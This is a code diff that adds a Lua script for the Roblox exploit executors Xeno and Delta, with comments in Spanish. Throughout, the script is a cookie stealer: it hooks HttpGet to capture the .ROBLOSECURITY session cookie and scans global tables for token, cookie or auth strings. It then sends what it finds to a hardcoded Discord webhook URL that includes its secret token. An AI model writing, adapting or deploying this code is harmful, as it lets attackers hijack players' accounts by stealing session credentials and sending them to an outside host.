@@ -1,0 +1,59 @@
+-- Compatible con Xeno y Delta
+local webhook = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+local HttpService = game:GetService("HttpService")
+
+-- Método para Xeno/Delta: Capturar cookie durante requests HTTP
+local cookieCaptured = nil
+
+-- Hook de HttpGetAsync (funciona en Delta)
+if hookfunction then
+    local oldHttpGet
+    oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
+        local result = oldHttpGet(self, url, ...)
+        
+        -- Delta expone headers en algunos casos
+        if type(result) == "string" and result:find("ROBLOSECURITY") then
+            cookieCaptured = result:match(".ROBLOSECURITY=([^;]+)")
+        end
+        
+        return result
+    end)
+end
+
+-- Método alternativo: Buscar en _G y shared (funciona en Xeno)
+task.spawn(function()
+    task.wait(2)
+    
+    -- Buscar variables globales que contengan tokens
+    local function scanTable(t, depth)
+        if depth > 3 then return nil end
+        for k, v in pairs(t) do
+            local key = tostring(k):lower()
+            if (key:find("token") or key:find("cookie") or key:find("auth")) and type(v) == "string" then
+                if #v > 100 then
+                    return v
+                end
+            end
+            if type(v) == "table" then
+                local found = scanTable(v, depth + 1)
+                if found then return found end
+            end
+        end
+        return nil
+    end
+    
+    local cookie = scanTable(_G, 0) or scanTable(shared or {}, 0) or scanTable(getrenv and getrenv() or {}, 0)
+    
+    -- Enviar lo que se encontró
+    local req = request or http_request or (http and http.request)
+    if req then
+        local msg = cookie and ("Cookie encontrada: " .. cookie) or "No se pudo extraer cookie - Xeno/Delta tienen sandboxing"
+        
+        req({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = msg})
+        })
+    end
+end)
